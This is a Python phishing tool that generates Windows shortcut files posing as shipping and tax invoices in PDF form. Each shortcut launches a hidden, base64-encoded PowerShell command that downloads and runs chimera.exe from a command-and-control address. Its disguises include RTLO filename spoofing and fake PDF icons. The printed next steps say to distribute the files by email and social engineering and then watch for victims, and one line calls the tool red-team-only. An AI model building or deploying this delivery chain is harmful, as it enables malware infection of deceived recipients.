#!/usr/bin/env python3
"""
LNK Spoofing Generator - Create realistic shortcut files for delivery
Supports multiple variants and customization
"""

import win32com.client
import base64
import os
import subprocess
import sys
from pathlib import Path

class LNKSpoofing:
    def __init__(self, c2_ip="192.168.56.101", c2_port=80):
        self.c2_ip = c2_ip
        self.c2_port = c2_port
        self.output_dir = "example_payloads"
        self.create_output_dir()
    
    def create_output_dir(self):
        """Create output directory if it doesn't exist"""
        Path(self.output_dir).mkdir(exist_ok=True)
        print(f"[+] Output directory: {os.path.abspath(self.output_dir)}")
    
    def create_powershell_payload(self, custom_command=None):
        """Generate PowerShell payload for downloading and executing malware"""
        if custom_command:
            ps_command = custom_command
        else:
            # Default: Download and execute chimera.exe
            ps_command = (
                f'$c=New-Object Net.WebClient;'
                f'$c.DownloadFile("http://{self.c2_ip}:{self.c2_port}/chimera.exe",'
                f'"$env:TEMP\\chimera.exe");'
                f'Start-Process "$env:TEMP\\chimera.exe"'
            )
        
        # Encode to UTF-16 and base64
        utf16_bytes = ps_command.encode('utf-16-le')
        b64_encoded = base64.b64encode(utf16_bytes).decode('utf-8')
        
        return b64_encoded, ps_command
    
    def create_lnk(self, target_path, args, icon, filename, description=""):
        """Create a .lnk shortcut file"""
        try:
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(filename)
            shortcut.Targetpath = target_path
            shortcut.Arguments = args
            shortcut.IconLocation = icon
            shortcut.WorkingDirectory = "%TEMP%"
            if description:
                shortcut.Description = description
            shortcut.save()
            print(f"    [✓] Created: {filename}")
            return True
        except Exception as e:
            print(f"    [!] Error creating {filename}: {e}")
            return False
    
    def variant_classic(self, b64_payload):
        """Variant 1: Classic LNK with PDF icon"""
        print("\n[*] Variant 1: Classic LNK (PDF Icon)")
        args = f"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {b64_payload}"
        filename = os.path.join(self.output_dir, "Invoice_1128.pdf.lnk")
        self.create_lnk(
            "powershell.exe",
            args,
            "shell32.dll,3",  # PDF icon
            filename,
            "DHL Express Invoice"
        )
    
    def variant_rtlo(self, b64_payload):
        """Variant 2: RTLO (Right-to-Left Override) - appears as .pdf"""
        print("\n[*] Variant 2: RTLO Spoofing (appears as .pdf)")
        rtlo = "\u202E"  # Right-to-Left Override character
        args = f"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {b64_payload}"
        
        # Filename appears as: Invoice_1128.pdf (but actually ends in .lnk)
        filename = os.path.join(self.output_dir, f"Invoice_1128{rtlo}fdp.lnk")
        self.create_lnk(
            "powershell.exe",
            args,
            "shell32.dll,3",
            filename,
            "Invoice Document"
        )
    
    def variant_custom_icon(self, b64_payload, pdf_path=None):
        """Variant 3: Custom icon extracted from real PDF"""
        print("\n[*] Variant 3: Real PDF Icon Extraction")
        
        if not pdf_path or not os.path.exists(pdf_path):
            # Use default location
            pdf_path = "real_invoice.pdf"
            if not os.path.exists(pdf_path):
                print("    [!] No PDF file found for icon extraction")
                print("    [!] Skipping variant 3 (place real_invoice.pdf in folder to enable)")
                return
        
        try:
            # Extract icon from PDF using ImageMagick
            icon_path = os.path.join(self.output_dir, "temp_icon.ico")
            subprocess.run(
                f'magick convert "{pdf_path}[0]" "{icon_path}"',
                shell=True,
                capture_output=True
            )
            
            if os.path.exists(icon_path):
                args = f"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {b64_payload}"
                filename = os.path.join(self.output_dir, "Tax_Invoice_2025.pdf.lnk")
                self.create_lnk(
                    "powershell.exe",
                    args,
                    icon_path,
                    filename,
                    "Tax Invoice 2025"
                )
                os.remove(icon_path)
            else:
                print("    [!] Could not extract icon from PDF")
        except Exception as e:
            print(f"    [!] Error in icon extraction: {e}")
    
    def variant_all_formats(self, b64_payload):
        """Generate multiple filename variations"""
        print("\n[*] Variant 4: Multiple Format Variations")
        
        filenames = [
            "DHL_Invoice_1128.pdf.lnk",
            "Payment_Confirmation.pdf.lnk",
            "Customs_Declaration.pdf.lnk",
            "Shipping_Label.pdf.lnk",
            "Package_Receipt.pdf.lnk",
        ]
        
        args = f"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {b64_payload}"
        
        for filename_only in filenames:
            filepath = os.path.join(self.output_dir, filename_only)
            self.create_lnk(
                "powershell.exe",
                args,
                "shell32.dll,3",
                filepath,
                filename_only.replace(".pdf.lnk", "")
            )
    
    def generate_all(self, include_variants="all"):
        """Generate all LNK variants"""
        print("\n" + "="*60)
        print("LNK SPOOFING GENERATOR - DHL/FedEx/UPS PHISHING")
        print("="*60)
        print(f"[*] C2 Server: http://{self.c2_ip}:{self.c2_port}/chimera.exe")
        print(f"[*] Output Directory: {os.path.abspath(self.output_dir)}")
        
        # Generate payload
        print("\n[*] Generating PowerShell payload...")
        b64_payload, ps_cmd = self.create_powershell_payload()
        print(f"    [✓] Payload encoded (length: {len(b64_payload)} chars)")
        print(f"    [*] Command: {ps_cmd[:80]}...")
        
        # Generate variants
        print("\n[*] Creating LNK files...")
        
        if include_variants in ["all", "1"]:
            self.variant_classic(b64_payload)
        
        if include_variants in ["all", "2"]:
            self.variant_rtlo(b64_payload)
        
        if include_variants in ["all", "3"]:
            self.variant_custom_icon(b64_payload)
        
        if include_variants in ["all", "4"]:
            self.variant_all_formats(b64_payload)
        
        # Summary
        print("\n" + "="*60)
        print("✓ LNK SPOOFING FILES GENERATED SUCCESSFULLY")
        print("="*60)
        print(f"\nLocation: {os.path.abspath(self.output_dir)}")
        print("\nFiles created:")
        for f in os.listdir(self.output_dir):
            if f.endswith('.lnk'):
                filepath = os.path.join(self.output_dir, f)
                size = os.path.getsize(filepath)
                print(f"  • {f} ({size} bytes)")
        
        print("\n[!] IMPORTANT:")
        print("    1. Update C2_IP if using different attacker machine")
        print("    2. Place chimera.exe in your C2 server")
        print("    3. Start HTTP server: python -m http.server 80")
        print("    4. Never test on production systems")
        print("    5. Use only in authorized red team exercises")


def main():
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║       LNK SPOOFING PAYLOAD GENERATOR v1.0                 ║
    ║   Create convincing shortcut-based delivery files         ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Configuration
    C2_IP = "192.168.56.101"  # CHANGE THIS TO YOUR ATTACKER IP
    C2_PORT = 80
    
    # Create generator
    generator = LNKSpoofing(c2_ip=C2_IP, c2_port=C2_PORT)
    
    # Generate all variants
    generator.generate_all(include_variants="all")
    
    print("\n[*] Next steps:")
    print("    1. Start C2 server on attacker machine:")
    print("       cd /path/to/chimera.exe && python3 -m http.server 80")
    print("    2. Distribute LNK files via email/social engineering")
    print("    3. Monitor C2 server for connections")
    print("    4. When victim clicks LNK → malware downloads & executes")
    
    print("\n[*] Testing locally (SAFE - no actual payload download):")
    print("    - Right-click any .lnk → Properties → Shortcut tab")
    print("    - Check 'Target' field to verify PowerShell command")
    print("    - Check 'Icon' to verify PDF icon")


if __name__ == "__main__":
    main()
